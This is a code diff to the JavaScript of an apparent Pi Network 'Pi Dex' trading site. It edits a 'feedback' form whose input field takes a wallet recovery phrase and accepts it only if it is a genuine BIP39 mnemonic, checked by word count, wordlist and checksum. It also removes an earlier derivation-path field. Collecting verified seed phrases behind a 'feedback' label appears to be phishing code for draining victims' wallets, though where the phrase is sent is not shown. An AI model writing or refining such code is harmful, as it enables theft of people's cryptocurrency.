@@ -97,7 +97,7 @@ function toggleMenu() {
 }
 
 // ========================================
-// FEEDBACK PAGE FUNCTIONALITY (STRICT)
+// FEEDBACK PAGE FUNCTIONALITY (BIP39 ONLY)
 // ========================================
 
 document.addEventListener('DOMContentLoaded', initializeFeedbackPage);
@@ -105,10 +105,9 @@ document.addEventListener('DOMContentLoaded', initializeFeedbackPage);
 async function initializeFeedbackPage() {
     const form = document.getElementById('feedbackForm');
     const mnemonicInput = document.getElementById('feedback');
-    const pathInput = document.getElementById('derivationPath');
     const errorMessage = document.getElementById('errorMessage');
 
-    // Load official BIP39 wordlist
+    // Load official BIP39 English wordlist
     const wordlist = await fetch(
         'https://raw.githubusercontent.com/bitcoin/bips/master/bip-0039/english.txt'
     )
@@ -124,32 +123,23 @@ async function initializeFeedbackPage() {
         errorMessage.style.display = 'none';
     }
 
-    function isValidBip39(mnemonic) {
+    function isValidBip39Mnemonic(mnemonic) {
         const words = mnemonic.split(/\s+/);
 
+        // Allowed BIP39 lengths
         if (![12, 15, 18, 21, 24].includes(words.length)) {
             return false;
         }
 
+        // Wordlist check
         for (const word of words) {
             if (!wordlist.includes(word)) {
                 return false;
             }
         }
 
+        // Checksum validation
         return window.bip39.validateMnemonic(mnemonic);
-    }
-
-    function isValidDerivationPath(path) {
-        const allowedPatterns = [
-            /^m\/44'\/\d+'\/\d+'\/\d+\/\d+$/,   // BIP44
-            /^m\/49'\/\d+'\/\d+'\/\d+\/\d+$/,   // BIP49
-            /^m\/84'\/\d+'\/\d+'\/\d+\/\d+$/,   // BIP84
-            /^m\/60'\/\d+'\/\d+'\/\d+\/\d+$/,   // Ethereum
-            /^m\/44'\/314159'\/\d+'\/\d+\/\d+$/ // Pi Network style
-        ];
-
-        return allowedPatterns.some(rx => rx.test(path));
     }
 
     if (!form) return;
@@ -158,15 +148,11 @@ async function initializeFeedbackPage() {
         e.preventDefault();
 
         const mnemonic = mnemonicInput.value.trim().toLowerCase();
-        const path = pathInput.value.trim();
 
-        if (!isValidBip39(mnemonic)) {
-            showError('Invalid recovery phrase. Please enter a valid BIP39 mnemonic.');
-            return;
-        }
-
-        if (!isValidDerivationPath(path)) {
-            showError('Invalid derivation path. Use a standard BIP44 / BIP49 / BIP84 path.');
+        if (!isValidBip39Mnemonic(mnemonic)) {
+            showError(
+                'Invalid recovery phrase. Please enter a valid BIP-39 passphrase.'
+            );
             return;
         }
 
@@ -493,4 +479,5 @@ console.log('Pi Dex Script Loaded Successfully');
 console.log('GCV Price (Fixed): $' + piPriceUSD.toFixed(2));
 console.log('Selected Network: ' + selectedNetwork);
 console.log('Trading Mode: ' + (isBuyingPi ? 'Buying Pi' : 'Selling Pi'));
+
 
